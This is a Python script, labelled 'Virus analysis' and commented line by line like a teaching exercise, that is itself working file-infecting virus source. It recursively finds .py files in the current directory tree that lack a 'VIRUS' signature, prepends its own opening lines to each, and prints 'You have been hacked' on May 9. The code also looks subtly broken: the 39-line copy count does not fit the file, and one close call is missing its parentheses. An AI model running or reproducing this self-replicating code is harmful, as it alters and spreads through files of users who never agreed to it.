#!/usr/bin/env python3

# Author - Jeremy Burks
# Last Revised - 6/06/2022
# Purpose - Virus analysis 

#import os and datetime library 
import os
import datetime

#assigns the string VIRUS to the varible SIGNATURE
SIGNATURE = "VIRUS"

# defining the function that looks for files that do not already have the virus and returns a list of those files 
def locate(path):
    #empty list 
    files_targeted = []
    #using the os method listdir to list all directories with the argument "path"
    filelist = os.listdir(path)
    #a for loop using the variable fname to represent each file in the filelist
    for fname in filelist:
        #a conditional to check if fname is a directory or python file 
        if os.path.isdir(path+"/"+fname):
            #if the file is a directory it will recursively call the function 
            files_targeted.extend(locate(path+"/"+fname))
            #an elif conditional if the file is python 
        elif fname[-3:] == ".py":
            #The varible infected is set to false
            infected = False
            #find a python file, opening it up and searches each line for the string "VIRUS"
            for line in open(path+"/"+fname):
                #if the string VIRUS is in the line then change the infected variable from false to true 
                if SIGNATURE in line:
                    infected = True
                    #This breaks out of the loop
                    break
                #if infected variable is equal to false it appends the path to the files targeted list  
            if infected == False:
                files_targeted.append(path+"/"+fname)
                #this returns the list of file paths that this function has gone though
    return files_targeted

#defining the function infect with the argument files_targeted from function above
def infect(files_targeted):
    #this is opening an absolute path 
    virus = open(os.path.abspath(__file__))
    #this is setting a varible to an empty string 
    virusstring = ""
    #a for loop that goes through every line in the absolute path. Enumerate keeps count of how many lines there are
    for i,line in enumerate(virus):
        #goes through virus file and copies the contents of it into a variable called virusstring
        if 0 <= i < 39:
            virusstring += line
            #this closes the virus file
    virus.close
    #a for loop that opens all of the files that are in the files targeted list
    for fname in files_targeted:
        #this opens the file
        f = open(fname)
        #saves the contents of the file into a varible called temp
        temp = f.read()
        #this closes the file
        f.close()
        #this opens the file again but with write access
        f = open(fname,"w")
        #This writes contents of virusstring into the orginal file.
        f.write(virusstring + temp)
        #this closes the file
        f.close()

#defining the detonate function
def detonate():
    #a conditional that sets it to detonate on May 9th 
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        #this prints to the screen "you have been hacked"
        print ("You have been hacked")

#this is calling the locate function that returns the list of files 
files_targeted = locate(os.path.abspath(""))
#calls the infect function with the contents of files_targeted
infect(files_targeted)
#detonates the virus 
detonate()
